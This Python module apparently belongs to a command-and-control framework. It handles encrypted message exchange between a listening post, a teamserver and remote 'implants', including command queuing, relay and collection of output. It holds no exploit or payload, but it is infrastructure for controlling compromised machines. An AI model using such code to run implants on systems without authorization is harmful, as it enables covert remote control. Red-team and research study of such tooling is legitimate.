from time import time

from lib import instructions
from lib import transmit
from lib import implants
from lib.crypto import asymmetric


def _get_transport_index(listener, transport_id):
    try:
        transport_index = next(
            index for (index, transport) in enumerate(listener.transports) if transport.transport_id == transport_id)
        return transport_index
    except StopIteration:
        listener.logging.log(f"{transport_id} not found!",
                             level="error", source="lib.implants")
        pass


def send_manifest(frame, listener):
    """
    RECEIVES: Request for a manifest, Teamserver pubkey for next transaction
    SENDS: Listening post manifest, LP pubkey use for next transaction
    SETS: TS pubkey, LP keypair

    :param frame:
    :param listener:
    :return:
    """
    listener.ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][0]['tpk']))
    # TODO: HIGH_PRI: Make a listener.manifest
    data = {'component_id': listener.component_id, "cmd": "lpm",
            "args": [listener.manifest, {"lpk": listener.initial_public_key._public_key}],
            "txid": frame['txid']}
    instruction_frame = instructions.create_instruction_frame(data)
    # TODO: value setting
    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, "teamserver")
    return reply_frame


def send_initialization(listener):
    """
    RECEIVES: None
    SENDS: Listening post initialization, Listening post pubkey for next transaction
    SETS: LP Keypair, LP State
    :return:
    """
    data = {'component_id': listener.component_id, "cmd": "lpi",
            "args": [{"lpk": listener.initial_public_key._public_key}]}
    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_sealed_frame(listener, instruction_frame)
    return reply_frame


def rekey(frame, listener):
    data = {'component_id': listener.component_id, "cmd": "rko",
            "args": [{"lpk": listener.initial_public_key._public_key}]}

    listener.ts_pubkey = asymmetric.public_key_from_bytes(listener.config.config['crypto']['ts_pk'])
    listener.current_private_key = listener.initial_private_key
    listener.current_public_key = listener.initial_public_key

    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, "teamserver")
    return reply_frame


def initialized(frame, listener):
    reply_frame = None
    listener.current_ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][0]['tpk']))
    listener.listening_post.status = "READY"
    return reply_frame


def noop(frame, listener):
    reply_frame = None
    listener.current_ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][0]['tpk']))
    return reply_frame


def request_command(listener):
    """
    RECEIVES: None
    SENDS: Implant commands to run, listening post pubkey for next transaction
    SETS: listener.cmd_queue, LP Keypair

    :param listener:
    :return:
    """
    done_cmds = []
    # TODO: Technically we're shipping the lp privkey for each implant over, we should probably scrub it, but it doesn't really matter since it's gonna rotate after this transaction anyways
    data = {'component_id': listener.component_id, "cmd": "gcmd",
            "args": [{"lpk": listener.initial_public_key._public_key}, {"implants": listener.implants}]}
    for command in listener.cmd_queue:
        if command['state'] == "OUTPUT_RECEIVED":
            # Set the command state to "OUTPUT_RELAYED"
            event_history = {"timestamp": time(), "event": "COMPLETED", "component": listener.component_id}
            command['history'].append(event_history)
            command['state'] = "COMPLETED"
            done_cmds.append(command)
    if len(done_cmds) > 0:
        data['done'] = done_cmds
    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, "teamserver")
    return reply_frame


def receive_command(frame, listener):
    cmd_txids = []
    done_cmds = []
    # Loop through each command in the list of received commands
    for command in frame['args'][0]:
        # First we get the index of the implant
        implant_index = implants._get_implant_index(listener, command['component_id'])
        # Now we can use that to set the implant's transport's ID in the command:
        command['transport_id'] = listener.implants[implant_index]['transport_id']
        # Now we'll ensure that the implant_id is set on the transport
        #  First we'll need the transport's index
        transport_index = _get_transport_index(listener, command['transport_id'])
        # Finally, we'll set the implant_id in the transport, we'll do this every time
        listener.transports[transport_index].implant_id = command['component_id']
        # Set the command state to "RELAYING"
        event_history = {"timestamp": time(), "event": "RECEIVED", "component": listener.component_id}
        command['history'].append(event_history)
        command['state'] = "RELAYING"
        listener.cmd_queue.append(command)
        cmd_txids.append(command['txid'])
    # This is in case we have commands we need to relay the output back to the TS for:
    for command in listener.cmd_queue:
        if command['state'] == "OUTPUT_RECEIVED":
            # Set the command state to "OUTPUT_RELAYED"
            event_history = {"timestamp": time(), "event": "OUTPUT_RELAYED", "component": listener.component_id}
            command['history'].append(event_history)
            command['state'] = "OUTPUT_RELAYED"
            done_cmds.append(command)
    data = {'component_id': listener.component_id, "txid": frame['txid'], "cmd": "rcok",
            "args": [{"cmd_txids": cmd_txids}, {"lpk": listener.current_public_key._public_key}], "done": done_cmds}
    listener.current_ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][1]['tpk']))
    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, "teamserver")
    return reply_frame


# TODO: Unused
# def relay_cmds(listener):
#     for command in listener.cmd_queue:
#         if command['state'] == "RELAYING":
#             try:
#                 implant_index = implants._get_implant_index(listener, command['component_id'])
#                 transport_index = _get_transport_index(listener, command['transport_id'])
#                 if str(implant_index) and str(transport_index):
#                     # TODO: Cook the command, you can resolve the implant's keys with the implant_index
#                     listener.transports[transport_index].send_data(command)
#             except Exception as e:
#                 listener.logging.log(
#                     f"Critical [{type(e).__name__}] when relaying command to implant {command['component_id']}: {e}",
#                     level="critical", source=f"lib.core")


def retrieve_command_for_implant(frame, listener):
    """
    Received a request for commands from the implant, this transaction is probably being awaited by the transport, so
    don't return anything until you have a command to return
    """
    return_commands = []
    implant_pubkey = frame['args'][0]['ipk']
    implant_id = frame['component_id']
    implant_index = implants._get_implant_index(listener, implant_id)
    listener.implants[implant_index]['ipk'] = implant_pubkey
    transport_index = _get_transport_index(listener, listener.implants[implant_index]['transport_id'])
    for command in listener.cmd_queue:
        if command['state'] == "RELAYING":
            try:
                if implant_index == implants._get_implant_index(listener, command['component_id']) and \
                        listener.transports[transport_index].transport_id == command['transport_id']:
                    event_history = {"timestamp": time(), "event": "SENT", "component": listener.component_id}
                    command['history'].append(event_history)
                    command['state'] = "RELAYED"
                    listener.logging.log(f"Relaying cmd: {command} to implant {implant_id}", level="debug",
                                         source=f"lib.core")
                    return_commands.append(command)
            except Exception as e:
                listener.logging.log(
                    f"Critical [{type(e).__name__}] when retreiving command for implant {command['component_id']}: {e}",
                    level="critical", source=f"lib.core")
    # Cook it with the implant's keys and make it a data frame
    # TODO: Rotate the key
    data = {'component_id': listener.component_id, "cmd": "gcmd",
            "args": [return_commands, {'lpk': listener.implants[implant_index]['lpk']}],
            "txid": frame['txid']}
    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, implant_id)
    return reply_frame


def get_cmd_output(frame, listener):
    cmd_txids = []
    implant_id = frame['component_id']
    implant_index = implants._get_implant_index(listener, implant_id)
    for command in frame['args'][0]:
        # Get the index of the implant
        implant_index = implants._get_implant_index(listener, command['component_id'])
        # Set the command state to "RELAYING"
        event_history = {"timestamp": time(), "event": "OUTPUT_RECEIVED", "component": listener.component_id}
        command['history'].append(event_history)
        command['state'] = "OUTPUT_RECEIVED"
        # Get the command index in the cmd_queue
        cmd_index = next(
            (index for (index, d) in enumerate(listener.cmd_queue) if d["txid"] == command['txid']),
            None)
        listener.logging.log(f"Received output for cmd: {command['txid']}", level="debug",
                             source=f"lib.core")
        listener.cmd_queue[cmd_index] = command
        cmd_txids.append(command['txid'])
    # TODO: Rotate the key
    data = {'component_id': listener.component_id, "cmd": "rcmda",
            "args": [cmd_txids, {'lpk': listener.implants[implant_index]['lpk']}],
            "txid": frame['txid']}
    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, implant_id)
    return reply_frame
